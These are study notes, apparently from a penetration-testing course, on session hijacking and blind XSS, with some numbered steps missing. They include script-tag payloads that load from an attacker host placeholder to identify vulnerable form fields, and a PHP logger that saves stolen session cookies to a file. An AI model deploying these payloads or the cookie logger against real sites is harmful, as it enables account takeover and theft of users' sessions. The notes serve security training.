# 🔐 Session Hijacking & Blind XSS – Notes

## 1. Session Hijacking (Concept)

- Web apps use **cookies** to maintain login session.
    
- If attacker steals cookie → can **login as victim without credentials**.
    
- Also called **Cookie Stealing**.
    

---

## 2. Blind XSS (Concept)

- XSS executes on a page **not accessible to attacker** (e.g., Admin panel).
    
- Input is stored and later viewed by admin.
    

### Common vulnerable inputs:

- Registration forms
    
- Contact forms
    
- Support tickets
    
- User-Agent
    

---

## 3. Problem in Blind XSS

- No direct output → cannot:
    
    - See alert box
        
    - Identify vulnerable field
        
    - Confirm payload
        

---

## Step 3: Identify Vulnerable Field

Inject per field:

```html
<script src=http://OUR_IP/username></script>
<script src=http://OUR_IP/fullname></script>
```

### Check terminal:

- `/username` → username field vulnerable
    
- `/fullname` → fullname field vulnerable

## Step 8: Create PHP Cookie Logger

**index.php**

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $value) {
        $cookie = urldecode($value);
        file_put_contents("cookies.txt", $cookie."\n", FILE_APPEND);
    }
}
?>
```
